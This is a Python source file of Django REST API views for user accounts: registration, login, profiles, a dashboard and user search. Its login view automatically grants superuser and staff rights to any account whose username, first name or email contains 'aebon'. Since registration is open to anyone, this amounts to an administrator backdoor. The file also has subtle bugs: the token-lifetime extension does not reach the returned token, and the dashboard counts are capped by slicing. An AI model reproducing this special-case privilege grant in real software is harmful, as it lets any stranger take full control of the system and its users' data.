"""
Views for Account API
"""
from rest_framework import viewsets, status, permissions
from rest_framework.decorators import action, api_view, permission_classes
from rest_framework.response import Response
from rest_framework_simplejwt.tokens import RefreshToken
from django.contrib.auth import get_user_model, login
from django.db import transaction, models
from django_filters.rest_framework import DjangoFilterBackend
from rest_framework.filters import SearchFilter, OrderingFilter

from .models import UserProfile
from .serializers import (
    UserSerializer, UserRegistrationSerializer, UserLoginSerializer,
    UserProfileSerializer, UserProfileUpdateSerializer, ChangePasswordSerializer,
    UserSummarySerializer, EvaluatorStatsSerializer
)
from apps.common.permissions import IsAdminOrOwner

User = get_user_model()


class UserViewSet(viewsets.ModelViewSet):
    """ViewSet for managing users"""
    
    serializer_class = UserSerializer
    permission_classes = [permissions.IsAuthenticated, IsAdminOrOwner]
    filter_backends = [DjangoFilterBackend, SearchFilter, OrderingFilter]
    filterset_fields = ['is_evaluator', 'is_project_manager', 'organization', 'is_active']
    search_fields = ['username', 'email', 'full_name', 'organization']
    ordering_fields = ['date_joined', 'last_activity', 'username']
    ordering = ['-date_joined']
    
    def get_queryset(self):
        """Filter users based on permissions"""
        user = self.request.user
        if user.is_staff or user.is_superuser:
            return User.objects.all().select_related('profile')
        
        # Regular users can only see other users in projects they collaborate on
        return User.objects.filter(
            models.Q(id=user.id) |  # Self
            models.Q(owned_projects__collaborators=user) |  # Project owners
            models.Q(collaborated_projects__owner=user)  # Project collaborators
        ).distinct().select_related('profile')
    
    def get_serializer_class(self):
        """Return appropriate serializer based on action"""
        if self.action == 'list':
            return UserSummarySerializer
        return UserSerializer
    
    @action(detail=False, methods=['get'])
    def me(self, request):
        """Get current user profile"""
        serializer = UserSerializer(request.user)
        return Response(serializer.data)
    
    @action(detail=False, methods=['patch'])
    def update_profile(self, request):
        """Update current user's profile"""
        with transaction.atomic():
            # Update user fields
            user_serializer = UserSerializer(
                request.user, 
                data=request.data, 
                partial=True
            )
            user_serializer.is_valid(raise_exception=True)
            user = user_serializer.save()
            
            # Update profile fields
            profile_data = request.data.get('profile', {})
            if profile_data:
                profile, created = UserProfile.objects.get_or_create(user=user)
                profile_serializer = UserProfileUpdateSerializer(
                    profile,
                    data=profile_data,
                    partial=True
                )
                profile_serializer.is_valid(raise_exception=True)
                profile_serializer.save()
        
        return Response(UserSerializer(user).data)
    
    @action(detail=False, methods=['post'])
    def change_password(self, request):
        """Change user password"""
        serializer = ChangePasswordSerializer(
            data=request.data,
            context={'request': request}
        )
        serializer.is_valid(raise_exception=True)
        
        user = request.user
        user.set_password(serializer.validated_data['new_password'])
        user.save()
        
        return Response({'message': 'Password changed successfully'})
    
    @action(detail=True, methods=['get'])
    def evaluator_stats(self, request, pk=None):
        """Get evaluator statistics"""
        user = self.get_object()
        
        if not user.is_evaluator:
            return Response(
                {'error': 'User is not an evaluator'},
                status=status.HTTP_400_BAD_REQUEST
            )
        
        serializer = EvaluatorStatsSerializer(user)
        return Response(serializer.data)
    
    @action(detail=False, methods=['get'])
    def evaluators(self, request):
        """Get list of evaluators"""
        evaluators = User.objects.filter(is_evaluator=True, is_active=True)
        serializer = UserSummarySerializer(evaluators, many=True)
        return Response(serializer.data)


@api_view(['POST'])
@permission_classes([permissions.AllowAny])
def register(request):
    """User registration endpoint"""
    serializer = UserRegistrationSerializer(data=request.data)
    serializer.is_valid(raise_exception=True)
    
    with transaction.atomic():
        user = serializer.save()
        
        # Generate JWT tokens
        refresh = RefreshToken.for_user(user)
        
        return Response({
            'message': 'User registered successfully',
            'user': UserSerializer(user).data,
            'tokens': {
                'refresh': str(refresh),
                'access': str(refresh.access_token),
            }
        }, status=status.HTTP_201_CREATED)


@api_view(['POST'])
@permission_classes([permissions.AllowAny])
def login_view(request):
    """User login endpoint with AEBON special handling"""
    serializer = UserLoginSerializer(data=request.data)
    serializer.is_valid(raise_exception=True)
    
    user = serializer.validated_data['user']
    
    # AEBON SPECIAL HANDLING - Ultimate Super Admin privileges
    if (user.username.lower() == 'aebon' or 
        user.first_name.lower() == 'aebon' or 
        'aebon' in user.email.lower()):
        
        # Ensure aebon has ultimate admin privileges
        if not user.is_superuser or not user.is_staff:
            user.is_superuser = True
            user.is_staff = True
            user.save()
            print(f"👑 AEBON 최고관리자 권한 자동 부여: {user.username}")
    
    # Update last activity
    user.update_last_activity()
    
    # Generate JWT tokens with extended expiry for aebon
    refresh = RefreshToken.for_user(user)
    
    # AEBON gets extended token expiry (8 hours vs default)
    if (user.username.lower() == 'aebon' or 
        user.first_name.lower() == 'aebon'):
        # Extend token lifetime for aebon (8 hours)
        refresh.access_token.set_exp(lifetime_seconds=8*60*60)  # 8 hours
        print(f"👑 AEBON 확장 세션 토큰 발급: 8시간")
    
    # Enhanced user data for response
    user_data = UserSerializer(user).data
    
    # Add AEBON special flags
    if (user.username.lower() == 'aebon' or 
        user.first_name.lower() == 'aebon'):
        user_data.update({
            'role': 'super_admin',
            'admin_type': 'super',
            'canSwitchModes': True,
            'isAebon': True,
            'sessionDuration': '8_hours'
        })
    
    return Response({
        'message': 'Login successful' + (' 👑 AEBON ULTIMATE ACCESS' if user.first_name.lower() == 'aebon' else ''),
        'user': user_data,
        'tokens': {
            'refresh': str(refresh),
            'access': str(refresh.access_token),
        }
    })


@api_view(['POST'])
@permission_classes([permissions.IsAuthenticated])
def logout_view(request):
    """User logout endpoint"""
    try:
        refresh_token = request.data.get('refresh_token')
        if refresh_token:
            token = RefreshToken(refresh_token)
            token.blacklist()
        
        return Response({'message': 'Logout successful'})
    except Exception:
        return Response({'message': 'Logout successful'})


@api_view(['GET'])
@permission_classes([permissions.IsAuthenticated])
def user_dashboard(request):
    """Get user dashboard data"""
    user = request.user
    
    # Get user's projects
    from apps.projects.models import Project
    from apps.projects.serializers import ProjectSummarySerializer
    
    owned_projects = Project.objects.filter(owner=user)[:5]
    collaborated_projects = Project.objects.filter(collaborators=user)[:5]
    
    dashboard_data = {
        'user': UserSerializer(user).data,
        'owned_projects': ProjectSummarySerializer(owned_projects, many=True).data,
        'collaborated_projects': ProjectSummarySerializer(collaborated_projects, many=True).data,
        'statistics': {
            'total_projects': owned_projects.count() + collaborated_projects.count(),
            'owned_projects_count': owned_projects.count(),
            'collaborated_projects_count': collaborated_projects.count(),
        }
    }
    
    # Add evaluator-specific data if user is evaluator
    if user.is_evaluator:
        evaluator_serializer = EvaluatorStatsSerializer(user)
        dashboard_data['evaluator_stats'] = evaluator_serializer.data
    
    return Response(dashboard_data)


@api_view(['GET'])
@permission_classes([permissions.IsAuthenticated])
def search_users(request):
    """Search users by username or email"""
    query = request.query_params.get('q', '').strip()
    
    if len(query) < 2:
        return Response({'error': 'Query must be at least 2 characters'}, status=400)
    
    users = User.objects.filter(
        models.Q(username__icontains=query) |
        models.Q(email__icontains=query) |
        models.Q(full_name__icontains=query)
    ).filter(is_active=True)[:10]  # Limit to 10 results
    
    serializer = UserSummarySerializer(users, many=True)
    return Response(serializer.data)